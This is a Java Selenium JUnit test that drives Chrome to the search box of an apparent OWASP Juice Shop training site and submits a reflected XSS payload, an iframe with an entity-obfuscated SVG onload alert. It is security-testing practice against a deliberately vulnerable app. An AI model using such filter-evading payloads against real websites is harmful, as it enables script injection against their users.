package com.mycompany.seleniumsectest;


import org.junit.Test;
import org.junit.Before;
import org.junit.After;
import static org.junit.Assert.*;
import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.core.IsNot.not;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.Dimension;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Alert;
import org.openqa.selenium.Keys;
import java.util.*;
public class DefaultSuiteTest {
  private WebDriver driver;
  private Map<String, Object> vars;
  private String payload = "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">";
  JavascriptExecutor js;
  
  @Before
  public void setUp() {
    System.setProperty("webdriver.chrome.driver","C:\\chromedriver.exe");
    driver = new ChromeDriver();
    js = (JavascriptExecutor) driver;
    vars = new HashMap<String, Object>();
  }
  @After
  public void tearDown() {
    driver.quit();
  }
  @Test
  public void xSS() {
    driver.get("http://juice-shop-trainning.herokuapp.com/");
    driver.manage().window().setSize(new Dimension(1920, 1040));
    driver.findElement(By.id("searchQuery")).sendKeys(payload);
    driver.findElement(By.id("searchButton")).click();

  }
}
